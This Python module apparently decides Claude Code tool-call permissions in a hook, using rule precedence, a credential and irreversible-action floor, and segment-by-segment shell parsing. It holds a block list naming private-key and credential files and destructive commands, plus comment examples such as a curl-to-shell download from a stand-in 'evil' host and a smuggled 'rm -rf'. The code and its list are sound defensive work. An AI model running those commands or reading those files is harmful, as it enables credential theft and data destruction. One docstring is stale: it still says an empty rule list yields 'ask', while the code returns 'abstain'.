"""Auto Review: decide a tool call before its permission prompt is ever drawn.

The socket protocol Claude Code speaks has no frame that answers a permission
prompt (spec M1), so the deck can never click "yes" on a dialog that is already
up. The only place a decision can land is *before* the prompt exists -- in a
`PreToolUse` hook, which may return allow / deny / ask (spec M2) -- or, as of the
`abstain` verdict below, decline to answer and let Claude Code decide.

This module is that decision, and nothing else: pure functions over a rule list.
No I/O beyond loading and saving the rule file, no imports from the daemon. The
hook (`hooks/cc-approve.js`) and the HTTP endpoint that fronts it are thin.

The ordering in `evaluate` is the whole point. `require_approval` is checked
before `always_allow` so that a narrow guard survives a broad allow -- the reference app's
precedence rule (spec M9). Position in the file means nothing; kind means
everything. Invert that and a user who carefully wrote "ask before git push"
loses it to the "allow all bash" rule sitting above it, which makes the feature
worse than having no rules at all.
"""

from __future__ import annotations

import glob
import json
import os
import shlex
from dataclasses import asdict, dataclass
from fnmatch import fnmatchcase
from pathlib import Path
from typing import Literal

from .paths import BUS_DIR
from . import atomic

#: "abstain" is not a fourth opinion, it is the absence of one: the deck holds
#: no rule about this call, so Claude Code's own permission engine -- its rules,
#: and in a hired desk its auto-mode classifier -- should decide.
#: `hooks/cc-approve.js` turns it into a hook result carrying NO
#: `permissionDecision` field at all, which is schema-valid (MEASURED on 2.1.263:
#: `permissionDecision` is `.optional()` on the `PreToolUse` output) and leaves
#: the CLI's pipeline to run.
#:
#: NOT the CLI's own `defer`. That is a real value of `permissionDecision`, and
#: it is the wrong one: MEASURED on 2.1.263 it is "print-mode only" and is
#: ignored in an interactive session, and for a served call it "refus[es] (no
#: resume machinery)". Saying nothing is the portable way to say nothing.
#:
#: This exists because answering "ask" is not neutral. MEASURED on 2.1.263, a
#: `PreToolUse` hook result is returned AS the decision -- `if(p)return p`,
#: before any rule is consulted -- and a hook "ask" is a floor even a classifier
#: allow cannot lift ("hookAskFloor -- a classifier allow re-surfaces as this
#: ask"). So while the deck answered "ask" for every call it had no rule about,
#: it was not observing the prompts on his board, it was creating them, and no
#: amount of configuring the CLI underneath it could have helped. Thirteen
#: cards, `pwd` among them.
#:
#: The failure floor is untouched. Every failure path in the hook still prints
#: "ask": a deck that is down, hung or talking nonsense must draw the prompt the
#: human would have got anyway. Only a deliberate 200 can say "abstain".
Decision = Literal["allow", "deny", "ask", "abstain"]

ALWAYS_ALLOW = "always_allow"
REQUIRE_APPROVAL = "require_approval"
DENY = "deny"

DEFAULT_PATH: Path = BUS_DIR / "autoreview.json"


@dataclass(frozen=True)
class Rule:
    id: str
    kind: str          # "always_allow" | "require_approval" | "deny"
    tool: str          # exact tool name, or "*"
    pattern: str       # fnmatch, matched against tool_subject()
    cwd: str           # fnmatch against the session cwd; "~" expanded
    note: str = ""
    # The DESK this rule speaks for, by name. Empty is the original, global
    # rule: any session, exact folder, whole-subject match. A desk rule is what
    # "Always allow" writes (see `asking.desk_rules`): it applies to that desk
    # under any session id -- a wake changes the id, never the name -- in its
    # folder AND BELOW, and a Bash desk rule covers one VERB, matched segment
    # by segment, so a compound command is allowed only when every command in
    # it is one he has already said yes to.
    desk: str = ""


@dataclass(frozen=True)
class Verdict:
    decision: Decision
    rule_id: str | None
    reason: str


# ── the secure-handoff floor ───────────────────────────────────────────────

# Spec M10: the reference app hands control back to the human for credentials, payments
# and irreversible actions. We make that a floor no user rule can lift, which is
# the one place this design is deliberately stricter than the product it copies.
# Matched case-insensitively against tool_subject().
HANDOFF_PATTERNS: tuple[str, ...] = (
    "*password*",
    "*passwd*",
    "*secret*",
    "*token*",
    "*credential*",
    "*.env*",
    "*ssh*key*",
    "*payment*",
    "*checkout*",
    "*rm -rf*",
    "*git push*--force*",
    "*drop table*",
    "*delete from*",
    # A private key is not spelled "key". `~/.ssh/id_rsa` matched NOTHING above
    # -- `*ssh*key*` needs the word after the word -- so the deck's own floor
    # had a hole exactly where it claimed to be strongest. Auto mode's
    # classifier blocks credential reads too, but it is a second model that can
    # be unavailable or fail a request; this floor is ours and costs a string
    # compare.
    "*/.ssh/*",
    "*id_rsa*",
    "*id_dsa*",
    "*id_ecdsa*",
    "*id_ed25519*",
    "*/.aws/*",
    "*/.gnupg/*",
    "*.netrc*",
    "*.npmrc*",
    "*.pypirc*",
    "*.git-credentials*",
    "*authorized_keys*",
    "*keychain*",
    "*.pem*",
    "*.p12*",
)


def is_handoff(tool_name: str, tool_input: dict) -> bool:
    """True when this call must go back to the human whatever the rules say."""
    subject = tool_subject(tool_name, tool_input).lower()
    return any(fnmatchcase(subject, p) for p in HANDOFF_PATTERNS)


# ── what a pattern is matched against ──────────────────────────────────────

# The one field per tool that carries the thing a human would actually read
# before approving. Anything not listed falls back to the whole input.
_SUBJECT_FIELDS: dict[str, str] = {
    "Bash": "command",
    "Read": "file_path",
    "Write": "file_path",
    "Edit": "file_path",
    "NotebookEdit": "notebook_path",
    "WebFetch": "url",
}


def _questions(tool_input: dict) -> str:
    """What `AskUserQuestion` is actually asking. PURE, "" when unreadable.

    The tool's input is `{"questions": [{"question": ..., "options": [...]}]}`.
    Serialised whole it reaches the owner as a wall of JSON in which the one
    sentence he needs is buried; this lifts the sentence out. The options are
    dropped on purpose -- he is being asked whether the agent may put the
    question to him, not to answer it here.
    """
    raw = tool_input.get("questions")
    if not isinstance(raw, list):
        return ""
    texts = [q.get("question") for q in raw if isinstance(q, dict)]
    return " / ".join(t.strip() for t in texts
                      if isinstance(t, str) and t.strip())


def _readable(tool_input: dict) -> str:
    """`container=acme-api tail=50` for a tool with no field of its own. PURE.

    The fallback used to be `json.dumps(tool_input)`, which was fine while this
    layer only ever saw six tools whose subject was a single string. Once the
    prompt-time door widened to every tool that can draw a modal, that fallback
    became the thing an MCP question looked like on the owner's phone -- and a
    question he cannot read is barely better than the stall it replaced.

    Still deterministic (sorted keys) because it is also the rule subject: two
    calls that differ only in dict ordering must be the same question.
    """
    parts = []
    for key in sorted(tool_input, key=str):
        value = tool_input[key]
        if isinstance(value, (dict, list)):
            try:
                value = json.dumps(value, sort_keys=True, default=str)
            except (TypeError, ValueError):
                value = str(value)
        parts.append(f"{key}={value}")
    return " ".join(parts)


def tool_subject(tool_name: str, tool_input: dict) -> str:
    """The single string every rule pattern matches against.

    Total by construction: an unknown tool, a missing field or a non-dict input
    all return a string rather than raising. This runs on the hot path of every
    tool call, so a new tool shipping in a future Claude Code release must
    degrade to "ask", never to a traceback.

    It may return "" -- an MCP operation that takes no arguments has no subject,
    and inventing one would be a lie. Callers that build a rule from it handle
    that (`asking._widen`); the tool name is still exact, so an empty subject
    widens to "this operation, in this folder" and no further.
    """
    if not isinstance(tool_input, dict):
        return str(tool_input)
    field = _SUBJECT_FIELDS.get(tool_name)
    if field is not None:
        value = tool_input.get(field)
        if isinstance(value, str):
            return value
    if tool_name == "AskUserQuestion":
        asked = _questions(tool_input)
        if asked:
            return asked
    try:
        return _readable(tool_input)
    except (TypeError, ValueError):
        return str(tool_input)


# ── matching ───────────────────────────────────────────────────────────────


def _matches(rule: Rule, *, tool_name: str, subject: str, cwd: str) -> bool:
    if rule.tool != "*" and rule.tool != tool_name:
        return False
    if not fnmatchcase(subject, rule.pattern):
        return False
    return fnmatchcase(cwd, os.path.expanduser(rule.cwd))


# ── desk rules: what "Always allow" writes ────────────────────────────────

#: The operators that end one shell command and begin the next. A token made
#: only of these is a boundary; `>&` and `&>` are redirections and stay put.
_SEPARATOR_CHARS = frozenset(";&|()\n")

#: Text inside which a command can run that no tokenizer here will see. A
#: subject holding one is not split at all: its class is itself, exactly.
_OPAQUE = ("$(", "`", "<(", ">(", "<<")


def shell_segments(command: str) -> list[list[str]] | None:
    """`a x; b y | c` -> `[["a","x"], ["b","y"], ["c"]]`. PURE.

    None when the command cannot be split honestly -- unbalanced quotes, or a
    command substitution / here-doc whose contents are commands of their own.
    Such a command is only ever matched whole, against an exact pin.

    `commenters` is cleared on purpose: shlex would otherwise treat a `#`
    inside a word as the start of a comment and silently drop everything after
    it, which is a place to hide `; rm -rf`.
    """
    text = str(command)
    if any(marker in text for marker in _OPAQUE):
        return None
    lexer = shlex.shlex(text, posix=True, punctuation_chars=";&|()<>\n")
    lexer.whitespace = " \t\r"
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        tokens = list(lexer)
    except ValueError:
        return None
    segments: list[list[str]] = []
    current: list[str] = []
    for token in tokens:
        if token and set(token) <= _SEPARATOR_CHARS:
            if current:
                segments.append(current)
            current = []
        else:
            current.append(token)
    if current:
        segments.append(current)
    return segments or None


def _word_match(text: str, pattern: str) -> bool:
    """`ls*` matches `ls` and `ls -la`, never `lsof`. PURE.

    A desk rule's pattern is a verb plus `*`, and a bare fnmatch would let the
    verb run on into a different binary. A pattern ending in `/*` is a folder
    and matches straight.
    """
    if pattern.endswith("*") and not pattern.endswith("/*"):
        base = pattern[:-1]
        return fnmatchcase(text, base) or fnmatchcase(text, base + " *")
    return fnmatchcase(text, pattern)


def _in_scope(rule: Rule, cwd: str) -> bool:
    """The folder on the card, and anything below it."""
    scope = rule.cwd.rstrip("/") or "/"
    return (fnmatchcase(cwd, scope)
            or fnmatchcase(cwd, scope + "*" if scope == "/" else scope + "/*"))


def desk_covers(rules: list[Rule], *, desk: str, tool_name: str,
                subject: str, cwd: str) -> Rule | None:
    """The desk rule that allows this call, or None. PURE.

    For Bash, EVERY command in the line must be covered by one of this desk's
    verbs: `grep x; rm -rf .` is not allowed by a yes to `grep`. A line that
    cannot be split is covered only by a rule pinned to exactly it.
    """
    if not desk:
        return None
    mine = [r for r in rules
            if r.kind == ALWAYS_ALLOW and r.desk == desk
            and r.tool == tool_name and _in_scope(r, cwd)]
    if not mine:
        return None
    if tool_name != "Bash":
        return next((r for r in mine if fnmatchcase(subject, r.pattern)), None)

    segments = shell_segments(subject)
    if segments is None:
        # Only an exact pin can cover a line nobody can see inside: `grep*`
        # must not wave through `grep $(curl evil | sh)`.
        pinned = glob.escape(subject)
        return next((r for r in mine if r.pattern == pinned), None)
    first: Rule | None = None
    for words in segments:
        line = " ".join(words)
        hit = next((r for r in mine if _word_match(line, r.pattern)), None)
        if hit is None:
            return None
        first = first or hit
    return first


def evaluate(rules: list[Rule], *, tool_name: str,
             tool_input: dict, cwd: str, desk: str = "") -> Verdict:
    """The verdict for one tool call.

    Order, and it is load-bearing:

    1. secure handoff -> ask, UNLESS this desk already said "always" to
       exactly this class (step 0 below). No global rule overrides it.
    2. a matching `deny` rule    -> deny.
    3. a matching `require_approval` rule -> ask.
    4. a matching `always_allow` rule, or this desk's own -> allow.
    5. nothing matched -> abstain.

    Step 0 is the owner's answer. The floor exists to put a credential or an
    irreversible action in front of him; once he has looked at the class on
    the card and said "never ask again" FOR THIS DESK, asking again is the
    deck overruling him. It is scoped to the desk, the folder and the verbs he
    saw, so nothing he did not read is lifted.

    Step 3 sits above step 4 on purpose: precedence comes from the rule's kind,
    never from where it sits in the file.

    Step 5 used to be `ask`, and that was the bug on his board. "Nothing matched"
    is not a reason to interrupt somebody; it is the deck having no opinion, and
    a hook that states an opinion it does not hold SHORT-CIRCUITS Claude Code's
    own engine (MEASURED on 2.1.263: the hook result is returned as the decision
    before any rule or classifier runs). Silence still never widens permission --
    abstaining hands the call to the CLI, whose own floor is to prompt.
    """
    subject = tool_subject(tool_name, tool_input)
    mine = desk_covers(rules, desk=desk, tool_name=tool_name,
                       subject=subject, cwd=cwd)

    if mine is None and is_handoff(tool_name, tool_input):
        return Verdict("ask", None, "secure handoff")

    def first(kind: str) -> Rule | None:
        for rule in rules:
            if rule.kind == kind and not rule.desk and _matches(
                rule, tool_name=tool_name, subject=subject, cwd=cwd
            ):
                return rule
        return None

    denied = first(DENY)
    if denied is not None:
        return Verdict("deny", denied.id, f"deny rule {denied.id}")

    asked = first(REQUIRE_APPROVAL)
    if asked is not None:
        return Verdict("ask", asked.id, f"require_approval rule {asked.id}")

    allowed = first(ALWAYS_ALLOW)
    if allowed is not None:
        return Verdict("allow", allowed.id, f"always_allow rule {allowed.id}")

    if mine is not None:
        return Verdict("allow", mine.id,
                       f"{desk} may, always (rule {mine.id})")

    return Verdict("abstain", None, "no rule")


# ── persistence ────────────────────────────────────────────────────────────


def _rule_from(raw: dict) -> Rule | None:
    if not isinstance(raw, dict):
        return None
    kind = str(raw.get("kind", ""))
    if kind not in (ALWAYS_ALLOW, REQUIRE_APPROVAL, DENY):
        return None
    return Rule(
        id=str(raw.get("id", "")),
        kind=kind,
        tool=str(raw.get("tool", "*")),
        pattern=str(raw.get("pattern", "*")),
        # `~` is expanded once, here, so the hot path never touches the
        # environment: the same rule file evaluates identically in a test.
        cwd=os.path.expanduser(str(raw.get("cwd", "**"))),
        note=str(raw.get("note", "")),
        desk=str(raw.get("desk", "") or ""),
    )


def load_rules(path: Path) -> list[Rule]:
    """Rules from disk. A missing or unreadable file is no rules, not a crash.

    Failing to parse must not hand out permission, and it does not: an empty
    list makes `evaluate` return "ask" for everything.
    """
    try:
        raw = json.loads(Path(path).read_text())
    except (OSError, ValueError):
        return []
    entries = raw.get("rules") if isinstance(raw, dict) else raw
    if not isinstance(entries, list):
        return []
    rules = [_rule_from(entry) for entry in entries]
    return [rule for rule in rules if rule is not None]


def save_rules(path: Path, rules: list[Rule]) -> None:
    """Write atomically -- tmp file then os.replace, as manager.py does.

    A reader on the hot path must never see half a rule file; a truncated read
    would silently drop every guard in it.
    """
    path = Path(path)
    body = {"version": 1, "rules": [asdict(rule) for rule in rules]}
    path.parent.mkdir(parents=True, exist_ok=True)
    atomic.write_text(path, json.dumps(body, indent=2))
